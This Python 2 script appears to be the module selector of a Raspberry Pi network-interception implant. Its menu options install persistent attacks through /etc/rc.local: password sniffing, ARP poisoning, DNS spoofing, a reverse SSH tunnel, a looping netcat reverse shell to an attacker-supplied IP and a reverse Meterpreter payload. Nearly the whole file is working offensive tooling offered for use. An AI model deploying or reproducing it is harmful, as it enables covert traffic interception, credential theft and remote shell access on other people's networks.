import os
class choice:

    def __init__(self):
        print("Starting Module:")

    def pas(self):
	temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/pas/pas.py &\nexit 0")
	open("/etc/rc.local", "w").write(temp)
        print("\nPassword_Sniffing Completed\n")

    def arp(self):
	temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "sudo python /home/pi/Int3rcept0r/arp/arp.py &\nexit 0")
	open("/etc/rc.local", "w").write(temp)
	print("\nARP_Poisoning Completed\n")

    def dns(self):
        open("/etc/dnsmasq.conf", "w").write(open("default_files/etc/dnsmasq.conf", "r").read())
        open("/etc/hosts", "w").write(open("dns/hosts", "r").read())
	os.system("sudo service dnsmasq restart")
	print("\nDNS_Spoofing Completed\n")

    def dns_dnsmasq(self):
        open("/etc/dnsmasq.conf", "w").write(open("dns/dnsmasq/dnsmasq.conf", "r").read())
        open("/etc/dnsmasq.hosts", "w").write(open("dns/hosts", "r").read())
        os.system("sudo service dnsmasq restart")
        print("\nDnsmasq_DNS_Spoofing Completed\n")
        
    def rev_ssh(self):
	ip = raw_input("Destination IP: ")
        vps_port = raw_input("VPS Port (leave blank for default => 22): ")
        if vps_port == "":
            vps_port = 22
        tunnel_port = raw_input("Tunnel Port (leave blank for default => 4444): ")
        if tunnel_port == "":
            tunnel_port = 4444
        com = 'autossh -M 10387 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -i /home/pi/.ssh/id_rsa -R %s:localhost:22 restricted_user@%s -p %s &' % (tunnel_port,ip,vps_port)
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", com + "\nexit 0")
	open("/etc/rc.local", "w").write(temp)
	print("\nReverse_SSH Completed\n")

    def rev_net(self):
        ip = raw_input("Destination IP: ")
        port = raw_input("Port: ")
        com = 'while [ 1 ]; do nc %s %s -e /bin/bash; sleep 30; done'% (ip,port)
        open("rev_net/nc.sh", "w").write(com)
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "/home/pi/Int3rcept0r/rev_net/nc.sh &" + "\nexit 0")
	open("/etc/rc.local", "w").write(temp)
	print("\nReverse_Netcat_Shell Completed\n")

    def rev_met(self):
	ip = raw_input("Destination IP: ")
        port = raw_input("Port: ")
        temp = open("met/default/shell.py","r").read()
        temp = temp.replace("host", ip).replace("l_port", port)
        open("met/shell.py", "w").write(temp)
        temp = open("/etc/rc.local", "r").read()
        temp = temp.replace("exit 0", "python /home/pi/Int3rcept0r/met/shell.py & \nexit 0")
        open("/etc/rc.local", "w").write(temp)
        print("\nReverse_TCP_Meterpreter worked\n")

    def power_only(self):
	os.system('sudo sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward"')
	temp = open("/etc/rc.local", "r").read()
	temp = temp.replace("iptables-restore < /etc/iptables.ipv4.nat", "")
        open("/etc/rc.local", "w").write(temp)
        print("\nPower_only Completed\n")

    def rst(self):
        open("/etc/rc.local", "w").write(open("default_files/etc/rc.local", "r").read())
        open("/etc/resolv.conf", "w").write(open("default_files/etc/resolv.conf", "r").read())
        open("/etc/dnsmasq.conf", "w").write(open("default_files/etc/dnsmasq.conf", "r").read())
        open("/etc/dnsmasq.hosts", "w").write(open("default_files/etc/dnsmasq.hosts", "r").read())
        open("/etc/hosts", "w").write(open("default_files/etc/hosts", "r").read())
        os.system("sudo service dnsmasq restart")
        os.system("sudo iptables-restore < /etc/iptables.ipv4.nat")
	os.system('sudo sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"')
	print("\nReset Completed\n")

meth = int(raw_input("""Please select which module to run

0 => Password Sniffing

1 => Arp Spoofing

2 => DNS Spoofing

3 => DNS Spoofing (using dnsmasq)

4 => Reverse SSH

5 => Reverse Netcat

6 => Reverse TCP Meterpreter

7 => USB power only

8 => Reset to Default

=>  """))
if meth < 0 or meth > 8:
	print("Not a valid option!\n")
else:
	c = choice()
        options = {0:c.pas,
                   1:c.arp,
                   2:c.dns,
                   3:c.dns_dnsmasq,
                   4:c.rev_ssh,
                   5:c.rev_net,
                   6:c.rev_met,
                   7:c.power_only,
                   8:c.rst}
        options[meth]()

